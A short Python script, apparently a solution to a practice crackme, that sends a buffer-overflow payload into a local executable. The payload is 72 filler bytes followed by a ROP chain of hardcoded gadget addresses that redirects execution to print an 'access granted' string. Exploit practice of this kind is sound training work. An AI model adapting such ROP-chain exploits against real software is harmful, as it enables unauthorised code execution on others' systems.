import struct
import subprocess

exe_path = 'easy_2.2.exe'

overflow = b"A" * 72

pop_rbp_ret = struct.pack("<Q", 0x1400012F5)

access_granted_address = struct.pack("<Q", 0x140004000)

mov_rcx_rbp_ret = struct.pack("<Q", 0x14000126D)

puts_address = struct.pack("<Q", 0x1400020B8)

payload = (
    overflow +
    pop_rbp_ret +
    access_granted_address +
    mov_rcx_rbp_ret +
    puts_address
)

process = subprocess.Popen(
    exe_path,
    stdin=subprocess.PIPE
)

stdout = process.communicate(input=payload)